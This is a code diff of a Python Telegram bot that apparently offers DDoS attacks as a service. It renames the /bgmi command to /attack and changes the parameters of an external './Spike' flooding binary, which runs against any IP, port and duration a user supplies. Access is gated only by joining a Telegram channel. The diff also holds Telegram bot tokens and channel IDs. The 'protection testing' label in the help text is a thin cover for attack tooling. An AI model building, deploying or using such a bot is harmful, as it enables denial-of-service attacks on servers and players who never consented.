@@ -17,15 +17,15 @@ from requests.exceptions import ReadTimeout
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 # Telegram bot token and channel IDs
-TOKEN = '7788865701:AAFLaelRum0FmfvJG_utuCqq2zT1OPZ4AIk'  # Replace with your actual bot token
-CHANNEL_ID = '-1002298552334'  # Replace with your specific channel or group ID for attacks
-FEEDBACK_CHANNEL_ID = '-1002272079452'  # Replace with your specific channel ID for feedback
+TOKEN = '7828525928:AAGZIUO4QnLsD_ITKGSkfN5NlGP3UZvU1OM'  # Replace with your actual bot token
+CHANNEL_ID = '-1002629547525'  # Replace with your specific channel or group ID for attacks
+FEEDBACK_CHANNEL_ID = '-1002688374033'  # Replace with your specific channel ID for feedback
 message_queue = []
 
 
 # Official channel details
-OFFICIAL_CHANNEL = "@titanfreeop"  # Replace with your channel username or ID
-CHANNEL_LINK = "https://t.me/titanfreeop"  # Replace with your channel link
+OFFICIAL_CHANNEL = "@titanddos24opop"  # Replace with your channel username or ID
+CHANNEL_LINK = "https://t.me/titanddos24opop"  # Replace with your channel link
 
 # Initialize the bot
 bot = telebot.TeleBot(TOKEN)
@@ -156,7 +156,7 @@ def handle_photo(message):
             os.remove(image_path)
 
 
-@bot.message_handler(commands=['bgmi'])
+@bot.message_handler(commands=['attack'])
 def bgmi_command(message):
     global attack_in_progress
     reset_daily_counts()
@@ -218,7 +218,7 @@ def bgmi_command(message):
     try:
         args = message.text.split()[1:]
         if len(args) != 3:
-            raise ValueError("Usage: /bgmi <IP> <PORT> <DURATION>")
+            raise ValueError("Usage: /attack <IP> <PORT> <DURATION>")
 
         ip, port, duration = args
         if not (ip.count('.') == 3 and all(0<=int(p)<=255 for p in ip.split('.'))):
@@ -271,7 +271,7 @@ def check_membership(call):
     """Handle the 'I've Joined' button click."""
     user_id = call.from_user.id
     if is_member(user_id):
-        bot.answer_callback_query(call.id, "✅ Thank you for joining! You can now use /bgmi.")
+        bot.answer_callback_query(call.id, "✅ Thank you for joining! You can now use /attack.")
     else:
         bot.answer_callback_query(call.id, "❌ You haven't joined the channel yet. Please join and try again.")
 
@@ -280,7 +280,7 @@ async def execute_attack(ip, port, duration, username):
     try:
         # Start the attack process with predefined values
         proc = await asyncio.create_subprocess_shell(
-            f"./Spike {ip} {port} {duration} 1024 10",
+            f"./Spike {ip} {port} {duration} 12 750",
             stderr=asyncio.subprocess.PIPE
         )
 
@@ -308,7 +308,7 @@ async def execute_attack(ip, port, duration, username):
 @bot.callback_query_handler(func=lambda call: call.data == "start_bgmi")
 def callback_query(call):
     bot.answer_callback_query(call.id)  # Acknowledge the callback
-    bot.send_message(call.message.chat.id, "Please type /bgmi in the chat to continue.")
+    bot.send_message(call.message.chat.id, "Please type /attack in the chat to continue.")
 
 
 
@@ -320,8 +320,8 @@ def send_welcome(message):
     *_A Powerful DDoS Protection Testing Tool_*
     
     📌 *Quick Start Guide*
-    1️⃣ Use /bgmi command to start attack
-    2️⃣ Follow format: /bgmi IP PORT TIME
+    1️⃣ Use /attack command to start attack
+    2️⃣ Follow format: /attack IP PORT TIME
     3️⃣ Provide feedback after each attack
     
     ⚠️ *Rules*
@@ -354,11 +354,11 @@ def send_help(message):
     
     📝 *Available Commands*
     /start - Show welcome message 🌟
-    /bgmi - Start attack 🚀
+    /attack - Start attack 🚀
     /help - Show this help message ❓
     
     🎯 *Attack Format*
-    `/bgmi 1.1.1.1 80 60`
+    `/attack 1.1.1.1 80 60`
     - IP: Target IP address 🌐
     - Port: Target port 🔌
     - Time: Attack duration in seconds ⏱️
